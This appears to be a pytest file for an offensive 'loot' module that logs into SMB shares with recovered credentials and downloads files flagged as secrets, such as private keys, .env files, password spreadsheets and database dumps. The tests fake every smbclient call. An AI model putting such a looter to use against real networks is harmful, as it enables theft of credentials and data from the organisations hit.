"""LAN file-loot — pull interesting files off SMB shares with recovered creds."""
import subprocess

from redux.loot.files import (
    SmbLooter, interesting, parse_shares, parse_listing,
)


def _cp(argv, rc=0, out="", err=""):
    return subprocess.CompletedProcess(argv, rc, out, err)


def test_interesting_heuristic():
    assert interesting("database.sql") and interesting("id_rsa") and interesting(".env")
    assert interesting("prod_passwords.xlsx") and interesting("backup.bak")
    assert not interesting("cat.jpg") and not interesting("notes.unknownext")


def test_parse_shares_skips_admin_plumbing():
    table = (
        "\tSharename       Type      Comment\n"
        "\t---------       ----      -------\n"
        "\tData            Disk      Company data\n"
        "\tIPC$            IPC       Remote IPC\n"
        "\tprint$          Disk      Printer Drivers\n"
        "\tBackups         Disk\n"
    )
    assert parse_shares(table) == ["Data", "Backups"]


def test_parse_listing_skips_dirs_and_dotdirs():
    listing = (
        "  .                                   D        0  Mon Jan  1 00:00:00 2024\n"
        "  ..                                  D        0  Mon Jan  1 00:00:00 2024\n"
        "  secrets.env                         A      120  Mon Jan  1 00:00:00 2024\n"
        "  subdir                              D        0  Mon Jan  1 00:00:00 2024\n"
        "  report.pdf                          A    50000  Mon Jan  1 00:00:00 2024\n"
    )
    assert parse_listing(listing) == ["secrets.env", "report.pdf"]


def _fake_smb(tmp):
    """A runner that answers -L / ls / get like smbclient."""
    def runner(argv, **kw):
        if "-L" in argv:
            return _cp(argv, 0, "Disk|Data|company\nDisk|IPC$|ipc\n")
        if argv[-1] == "ls":
            return _cp(argv, 0,
                       "  .            D   0  x\n"
                       "  creds.env    A  10  x\n"
                       "  cat.jpg      A  99  x\n"
                       "  db.sql       A  20  x\n")
        if argv[-1].startswith("get "):
            # simulate the file landing on disk
            local = argv[-1].split('"')[-2]
            open(local, "w").write("loot")
            return _cp(argv, 0)
        return _cp(argv, 0)
    return runner


def test_loot_host_pulls_only_interesting_files(tmp_path):
    looter = SmbLooter(runner=_fake_smb(tmp_path))
    pulled, notes = looter.loot_host("192.168.1.50", "root", "toor", dest=tmp_path)
    names = [p.split("_")[-1] for p in pulled]
    assert set(names) == {"creds.env", "db.sql"}      # .jpg skipped
    assert all(open(p).read() == "loot" for p in pulled)   # files actually landed
    assert any("Data" in n for n in notes)


def test_loot_host_respects_max_files(tmp_path):
    looter = SmbLooter(runner=_fake_smb(tmp_path), max_files=1)
    pulled, notes = looter.loot_host("10.0.0.5", "a", "b", dest=tmp_path)
    assert len(pulled) == 1
    assert any("max_files" in n for n in notes)


def test_pull_failure_is_not_fatal(tmp_path):
    def runner(argv, **kw):
        if "-L" in argv:
            return _cp(argv, 0, "Disk|Data|c\n")
        if argv[-1] == "ls":
            return _cp(argv, 0, "  secret.key   A  10  x\n")
        return _cp(argv, 1, "", "NT_STATUS_ACCESS_DENIED")   # get fails
    pulled, notes = SmbLooter(runner=runner).loot_host("h", "u", "p", dest=tmp_path)
    assert pulled == []                                # nothing pulled, no crash
